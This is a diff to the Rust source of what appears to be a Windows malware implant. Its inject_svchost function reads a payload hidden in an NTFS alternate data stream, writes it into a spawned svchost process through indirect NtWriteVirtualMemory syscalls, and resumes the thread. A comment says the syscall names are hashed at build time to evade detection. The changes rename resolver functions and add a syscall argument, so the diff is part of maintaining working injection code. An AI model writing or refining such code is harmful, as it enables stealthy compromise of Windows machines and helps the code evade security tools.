@@ -17,7 +17,7 @@ use winapi::um::winnt::{
 use winapi::um::handleapi::CloseHandle;
 use winapi::shared::minwindef::DWORD;
 
-use crate::syscall::{do_syscall, get_ssn};
+use crate::syscall::do_syscall;
 
 // Syscall names (hashed at build time by builder.py; raw names used here for clarity).
 const NT_WRITE_VM: &str  = "NtWriteVirtualMemory";
@@ -57,7 +57,7 @@ pub unsafe fn inject_svchost() -> bool {
     // ------------------------------------------------------------------
     // 2. Read ADS payload.
     // ------------------------------------------------------------------
-    let payload = match crate::resurrect::read_ads_pub() {
+    let payload = match crate::resurrect::read_ads() {
         Some(p) => p,
         None => {
             CloseHandle(pi.hThread);
@@ -85,7 +85,7 @@ pub unsafe fn inject_svchost() -> bool {
     // ------------------------------------------------------------------
     // 4. NtWriteVirtualMemory via indirect syscall.
     // ------------------------------------------------------------------
-    let ssn_wvm = match get_ssn(NT_WRITE_VM) {
+    let ssn_wvm = match crate::syscall::resolve_ssn(NT_WRITE_VM) {
         Some(s) => s,
         None => {
             CloseHandle(pi.hThread);
@@ -102,12 +102,13 @@ pub unsafe fn inject_svchost() -> bool {
         payload.as_ptr() as usize,
         payload.len(),
         &mut bytes_written as *mut usize as usize,
+        0,
     );
 
     // ------------------------------------------------------------------
     // 5. Resume the thread.
     // ------------------------------------------------------------------
-    let ssn_resume = match get_ssn(NT_RESUME) {
+    let ssn_resume = match crate::syscall::resolve_ssn(NT_RESUME) {
         Some(s) => s,
         None => {
             CloseHandle(pi.hThread);
